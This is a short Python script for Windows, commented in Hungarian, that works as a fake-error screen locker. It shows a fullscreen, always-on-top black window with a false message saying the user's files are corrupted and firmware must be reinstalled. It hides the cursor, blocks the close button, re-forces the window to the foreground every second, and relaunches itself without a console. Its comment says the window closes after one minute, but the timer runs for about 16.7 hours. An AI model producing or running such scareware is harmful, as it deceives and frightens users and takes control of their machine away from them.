import tkinter as tk
import ctypes
import os
import sys

def hide_cursor():
    """Rejtse el a kurzort a képernyőn."""
    ctypes.windll.user32.ShowCursor(False)

def show_cursor():
    """Mutassa meg a kurzort a képernyőn."""
    ctypes.windll.user32.ShowCursor(True)

def create_window():
    root = tk.Tk()
    root.attributes('-fullscreen', True)  # Teljes képernyős mód
    root.configure(bg='black')  # Fekete háttér
    root.attributes('-topmost', True)  # Az ablak mindig a legfelső rétegen legyen
    root.attributes('-disabled', True)  # Az ablak bezárási lehetőségek letiltása
    
    # Kurzor elrejtése
    hide_cursor()
    
    # Szöveg hozzáadása középre
    text = tk.Label(root, text="Fatal error occurred. Your files have been corrupted, please reinstall firmware.", 
                    fg='white', bg='black', font=('Helvetica', 24), wraplength=root.winfo_screenwidth() - 40)
    text.place(relx=0.5, rely=0.5, anchor='center')  # Szöveg középre helyezése

    # 1 perc után zárja be az ablakot
    root.after(60000000, root.destroy)
    
    # Megakadályozza, hogy a felhasználó bármilyen módon bezárja az ablakot
    root.protocol("WM_DELETE_WINDOW", lambda: None)  # Bezárás gomb letiltása

    # Az ablak folyamatos újra megjelenése
    def keep_window_on_top():
        ctypes.windll.user32.SetForegroundWindow(root.winfo_id())
        root.after(1000, keep_window_on_top)  # 1 másodpercenként újra a legfelső rétegen

    keep_window_on_top()

    root.mainloop()
    
    # Kurzor visszaállítása az ablak bezárása után
    show_cursor()

if __name__ == "__main__":
    # Ellenőrzi, hogy a scriptet `pythonw`-val futtatják-e
    if sys.executable.endswith('python.exe'):
        # Scriptet `pythonw`-val futtatjuk, ha nem az
        pythonw_path = sys.executable.replace('python.exe', 'pythonw.exe')
        if not os.path.exists(pythonw_path):
            print(f'Pythonw executable not found at {pythonw_path}')
            sys.exit(1)
        os.system(f'"{pythonw_path}" "{__file__}"')
    else:
        create_window()
